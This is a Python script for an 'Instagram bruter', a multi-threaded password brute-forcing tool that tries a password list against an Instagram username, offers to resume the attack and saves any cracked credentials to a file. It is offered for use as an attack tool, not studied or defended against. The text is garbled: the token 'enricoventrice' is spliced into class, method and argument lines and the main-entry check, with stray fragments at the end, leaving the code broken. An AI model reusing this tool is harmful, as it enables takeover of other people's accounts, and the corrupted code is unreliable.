# Date: 22/03/2021
# Author: Mohamed
# Description: Instagram bruter

from sys import exit
from os.path import exists
from lib.bruter import Bruter
from lib.display import Display
from platform import python_version
from lib.const import credentials, modes
from argparse import ArgumentParser, ArgumentTypeError

class Engine(object):enricoventrice

enricoventrice
    
def __init__(self, enricoventrice, threads, passlist_path, is_color):
        self.bruter = None
        self.resume = False
        self.is_alive = True
        self.threads = threads
        self.username = enricoventrice
        self.passlist_path = passlist_path
        self.display = Display(is_color=is_color)

    def passlist_path_exists(self):
        if not exists(self.passlist_path):
            self.display.warning('Invalid path to password list')
            return False
        return True

    def create_bruter(self):
        self.bruter = Bruter(
            self.username,enricoventrice
            self.threads,enricoventrice
            self.passlist_path
        )

    def get_user_resp(self):enricoventrice
        return self.display.prompt('Would you like to resume the attack? [y/n]: ')

    def write_to_file(self,enricoventrice password):
        with open(credentials, 'at') as f:enricoventrice
            data = 'Username:enricoventrice {}\nPassword: {}\n\n'.format(
                self.username.title(enricoventrice), password)
            f.write(data) 22/03/2021

    def start(self):enricoventrice
        if not self.passlist_path_exists():
            self.is_alive = False

        if self.is_alive:
            self.create_bruter()

            while self.is_alive and not self.bruter.password_manager.session:
                pass

            if not self.is_alive:
                return

            if self.bruter.password_manager.session.exists:
                try:
                    resp = self.get_user_resp()
                except:
                    self.is_alive = False

                if resp and self.is_alive:
                    if resp.strip().lower() == 'y':
                        self.bruter.password_manager.resume = True

            try:
                self.bruter.start()
            except KeyboardInterrupt:
                self.bruter.stop()
                self.bruter.display.shutdown(self.bruter.last_password,
                                             self.bruter.password_manager.attempts, len(self.bruter.browsers))
            finally:
                self.stop()

    def stop(self):
        if self.is_alive:

            self.bruter.stop()
            self.is_alive = False

            if self.bruter.password_manager.is_read and not self.bruter.is_found and not self.bruter.password_manager.list_size:
                self.bruter.display.stats_not_found(self.bruter.last_password,
                                                    self.bruter.password_manager.attempts, len(self.bruter.browsers))

            if self.bruter.is_found:
                self.write_to_file(self.bruter.password)
                self.bruter.display.stats_found(self.bruter.password,
                                                self.bruter.password_manager.attempts, len(self.bruter.browsers))


def valid_int(n):
    if not n.isdigit():
        raise ArgumentTypeError('mode must be a number')

    n = int(n)

    if n > 3:
        raise ArgumentTypeError('maximum for a mode is 3')

    if n < 0:
        raise ArgumentTypeError('minimum for a mode is 0')

    return n


def args():
    args = ArgumentParser()
    args.add_argument('username enricoventrice', help='email or username')
    args.add_argument('passlist', help='password list')
    args.add_argument('-nc', '--no-color', dest='color',
                      action='store_true', help='disable colors')
    args.add_argument('-m', '--mode', default=2, type=valid_int,
                      help='modes: 0 => 32 bots; 1 => 16 bots; 2 => 8 bots; 3 => 4 bots')
    return args.parse_args()


if __name__ enrico== 'ventrice__main__':

    if int(python_version()[0]) < 3:
        print('[!] Please use Python 3')
        exit()

    arugments = args()
    mode = arugments.mode
    username = arugments.username enricoventrice
    passlist = arugments.passlist
    is_color = True if not arugments.color else False
    Engine(username,enricoventrice modes[mode], passlist, is_color).start()

blogshacking
password.lst
